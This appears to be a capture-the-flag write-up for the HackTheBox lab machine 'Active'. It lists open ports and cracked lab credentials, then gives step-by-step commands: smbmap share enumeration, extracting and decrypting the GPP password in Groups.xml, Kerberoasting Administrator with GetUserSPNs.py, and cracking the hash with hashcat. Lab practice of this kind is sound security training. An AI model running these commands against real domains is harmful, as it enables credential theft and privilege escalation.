# Active

| Name   | IP           | Difficulty | OS   |
| ------ | ------------ | ---------- | ---- |
| active | 10.10.10.100 | Windows    | Easy |

## NMAP

| HOST         | PORT  | PROTO | SERVICE                                 | VERSION             |
| ------------ | ----- | ----- | --------------------------------------- | ------------------- |
| 10.10.10.100 | 135   | tcp   | Microsoft Windows RPC                   |                     |
| 10.10.10.100 | 139   | tcp   | Microsoft Windows netbios-ssn           |                     |
| 10.10.10.100 | 3268  | tcp   | Microsoft Windows Active Directory LDAP |                     |
| 10.10.10.100 | 3269  | tcp   |                                         |                     |
| 10.10.10.100 | 389   | tcp   | Microsoft Windows Active Directory LDAP |                     |
| 10.10.10.100 | 445   | tcp   |                                         |                     |
| 10.10.10.100 | 464   | tcp   |                                         |                     |
| 10.10.10.100 | 49152 | tcp   | Microsoft Windows RPC                   |                     |
| 10.10.10.100 | 49153 | tcp   | Microsoft Windows RPC                   |                     |
| 10.10.10.100 | 49154 | tcp   | Microsoft Windows RPC                   |                     |
| 10.10.10.100 | 49155 | tcp   | Microsoft Windows RPC                   |                     |
| 10.10.10.100 | 49157 | tcp   | Microsoft Windows RPC over HTTP         | 1.0                 |
| 10.10.10.100 | 49158 | tcp   | Microsoft Windows RPC                   |                     |
| 10.10.10.100 | 49165 | tcp   | Microsoft Windows RPC                   |                     |
| 10.10.10.100 | 53    | tcp   | Microsoft DNS                           | 6.1.7601 (1DB15D39) |
| 10.10.10.100 | 593   | tcp   | Microsoft Windows RPC over HTTP         | 1.0                 |
| 10.10.10.100 | 636   | tcp   |                                         |                     |
| 10.10.10.100 | 88    | tcp   | Microsoft Windows Kerberos              |                     |

## HEADERS



## DIRECTORIES



## USERS

- svc_tgs GPPstillStandingStrong2k18
- Administrator Ticketmaster1968

## NOTES

- Replication share is readable `smbmap -H 10.10.10.100`
- Groups.xml in the share `smbmap -R Replication -H 10.10.10.100 --depth 10`
- Download Groups.xml `smbmap -R Replication -H 10.10.10.100 --depth 10 -A Groups.xml -q`
- svc_tgs user and password in Groups.xml
- Use gpp-decrypt to decrypt the password
- Download the user flag `smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.10.10.100 --download 'C:\Users\SVC_TGS\Desktop\user.txt'`
- Administrator is Kerberoastable `GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs`
- Kerberoast `GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs:GPPstillStandingStrong2k18 -outputfile active_spns.txt`
- Crack the hash with hashcat `.\hashcat.exe -m 13100 .\hashes\active-htb.txt .\wordlists\rockyou.txt
- Download the root flag `smbmap -u Administrator -p Ticketmaster1968 -d active.htb -H 10.10.10.100 -R Users -A root.txt -q`
